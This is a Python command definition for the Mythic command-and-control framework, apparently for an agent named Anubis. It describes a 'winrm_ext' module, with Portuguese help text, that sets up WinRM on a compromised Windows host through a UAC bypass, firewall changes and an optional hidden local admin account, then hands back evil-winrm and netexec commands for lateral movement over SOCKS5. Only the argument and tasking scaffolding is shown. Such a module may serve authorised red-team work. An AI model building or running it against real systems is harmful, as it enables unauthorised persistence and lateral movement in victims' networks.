from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class WinrmExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(name="target", type=ParameterType.String,
                             required=False, default_value="",
                             description="IP/hostname alvo. Vazio = IP local do agente"),
            CommandParameter(name="port", type=ParameterType.Number,
                             required=False, default_value=5985,
                             description="Porta WinRM (5986 se ssl=True)"),
            CommandParameter(name="username", type=ParameterType.String,
                             required=False, default_value="",
                             description="Usuário dos comandos de conexão"),
            CommandParameter(name="password", type=ParameterType.String,
                             required=False, default_value="",
                             description="Senha dos comandos de conexão"),
            CommandParameter(name="domain", type=ParameterType.String,
                             required=False, default_value="",
                             description="Domínio (ex: CORP). Vazio = conta local"),
            CommandParameter(name="socks_port", type=ParameterType.Number,
                             required=False, default_value=7005,
                             description="Porta do SOCKS5 no servidor Mythic"),
            CommandParameter(name="add_user", type=ParameterType.String,
                             required=False, default_value="",
                             description="Cria usuário local admin (fallback de acesso)"),
            CommandParameter(name="ssl", type=ParameterType.Boolean,
                             required=False, default_value=False,
                             description="Listener HTTPS em 5986"),
            CommandParameter(name="action", type=ParameterType.String,
                             required=False, default_value="",
                             description="cleanup para reverter as alterações"),
        ]

    async def parse_arguments(self):
        line = self.command_line.strip()
        if not line:
            return
        if line.startswith("{"):
            await self.parse_dictionary(json.loads(line))
        else:
            parts = line.split()
            for i, key in enumerate(["target", "username", "password", "domain"]):
                if i < len(parts):
                    self.set_arg(key, parts[i])

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class WinrmExtCommand(CommandBase):
    cmd = "winrm_ext"
    needs_admin = False
    help_cmd = ("winrm_ext [target] [username] [password] [domain] | "
                "winrm_ext {json} | winrm_ext {\"action\":\"cleanup\"}")
    description = ("Configura WinRM no host do agente (listener, auth, UAC bypass, "
                   "firewall, add_user opcional) e retorna comandos de movimentação "
                   "lateral (evil-winrm / netexec) via SOCKS5 do Anubis")
    version = 1
    author = "@wtechsec"
    attackmapping = ["T1021.006", "T1090", "T1562.004", "T1136.001"]
    argument_class = WinrmExtArguments
    attributes = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if task.args.get_arg("action") == "cleanup":
            task.display_params = "cleanup"
        else:
            target = task.args.get_arg("target") or "<IP local>"
            task.display_params = "%s:%s" % (target, task.args.get_arg("port"))
        return task

    async def process_response(self, task: PTTaskMessageAllData,
                               response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
